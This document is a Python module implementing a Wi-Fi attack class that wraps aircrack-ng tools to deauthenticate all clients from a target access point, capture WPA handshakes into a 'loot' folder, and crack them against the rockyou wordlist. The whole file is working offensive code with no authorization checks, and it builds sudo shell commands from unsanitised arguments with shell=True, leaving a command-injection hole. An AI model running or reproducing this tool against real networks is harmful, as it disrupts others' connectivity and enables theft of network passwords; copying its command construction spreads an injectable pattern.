"""WiFi attack utilities (deauth, handshake capture)."""
import os
import time
import logging
import subprocess
from pathlib import Path
from typing import Optional
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class AttackConfig:
    """Configuration for attacks."""
    deauth_count: int = 20
    deauth_interval: int = 5
    max_duration: int = 300


class WiFiAttacker:
    """Handles WiFi attacks (deauth, handshake capture)."""

    def __init__(self, config: Optional[AttackConfig] = None):
        """Initialize attacker.
        
        Args:
            config: Attack configuration
        """
        self.config = config or AttackConfig()
        self.active_process: Optional[subprocess.Popen] = None
        self.loot_dir = Path("./loot")
        self.loot_dir.mkdir(exist_ok=True)

    def deauth_attack(
        self,
        bssid: str,
        iface: str,
        duration: int = 60
    ) -> bool:
        """Launch deauthentication attack.
        
        Args:
            bssid: Target BSSID
            iface: Interface name
            duration: Attack duration in seconds
            
        Returns:
            True if attack started successfully
        """
        try:
            logger.info(f"Starting deauth attack on {bssid}...")
            
            cmd = (
                f"sudo aireplay-ng "
                f"--deauth {self.config.deauth_count} "
                f"-a {bssid} "
                f"-c FF:FF:FF:FF:FF:FF "
                f"{iface}"
            )
            
            self.active_process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            logger.info(f"Deauth attack launched (PID: {self.active_process.pid})")
            return True
        except Exception as e:
            logger.error(f"Error launching deauth attack: {e}")
            return False

    def capture_handshake(
        self,
        bssid: str,
        channel: str,
        iface: str,
        ssid: str,
        duration: int = 300
    ) -> Optional[str]:
        """Capture WPA handshake.
        
        Args:
            bssid: Target BSSID
            channel: Target channel
            iface: Interface name
            ssid: Network SSID
            duration: Capture duration in seconds
            
        Returns:
            Path to capture file or None if failed
        """
        try:
            # Create directory for this network
            safe_ssid = "".join(
                c if c.isalnum() else "_" for c in ssid
            )[:32]
            capture_dir = self.loot_dir / safe_ssid
            capture_dir.mkdir(exist_ok=True)
            
            capture_file = capture_dir / "handshake"
            
            logger.info(f"Starting handshake capture on {ssid}...")
            logger.info(f"Saving to: {capture_dir}")
            
            cmd = (
                f"sudo airodump-ng "
                f"-c {channel} "
                f"--bssid {bssid} "
                f"-w {capture_file} "
                f"{iface}"
            )
            
            self.active_process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            logger.info(f"Handshake capture started (PID: {self.active_process.pid})")
            logger.info("Press Ctrl+C to stop when handshake is captured.")
            
            # Wait for process
            try:
                self.active_process.wait(timeout=duration)
            except subprocess.TimeoutExpired:
                logger.warning("Handshake capture timeout reached")
                self.stop_attack()
            
            # Check if capture file was created
            cap_file = list(capture_dir.glob("handshake*"))
            if cap_file:
                logger.info(f"Handshake saved: {cap_file[0]}")
                return str(cap_file[0])
            else:
                logger.warning("No capture file found")
                return None
        except Exception as e:
            logger.error(f"Error capturing handshake: {e}")
            self.stop_attack()
            return None

    def stop_attack(self) -> bool:
        """Stop active attacks.
        
        Returns:
            True if stopped successfully
        """
        try:
            # Kill active process
            if self.active_process:
                self.active_process.terminate()
                try:
                    self.active_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.active_process.kill()
                self.active_process = None
            
            # Kill background processes
            subprocess.run("sudo pkill aireplay-ng", shell=True, capture_output=True)
            subprocess.run("sudo pkill airodump-ng", shell=True, capture_output=True)
            
            logger.info("All attacks stopped")
            return True
        except Exception as e:
            logger.error(f"Error stopping attacks: {e}")
            return False

    def crack_handshake(
        self,
        cap_file: str,
        wordlist: str = "/usr/share/wordlists/rockyou.txt"
    ) -> bool:
        """Crack WPA handshake.
        
        Args:
            cap_file: Path to capture file
            wordlist: Path to wordlist file
            
        Returns:
            True if cracking started
        """
        try:
            if not os.path.exists(cap_file):
                logger.error(f"Capture file not found: {cap_file}")
                return False
            
            if not os.path.exists(wordlist):
                logger.error(f"Wordlist not found: {wordlist}")
                return False
            
            logger.info(f"Starting handshake crack on {cap_file}...")
            
            cmd = f"sudo aircrack-ng -w {wordlist} {cap_file}"
            subprocess.run(cmd, shell=True)
            
            return True
        except Exception as e:
            logger.error(f"Error cracking handshake: {e}")
            return False
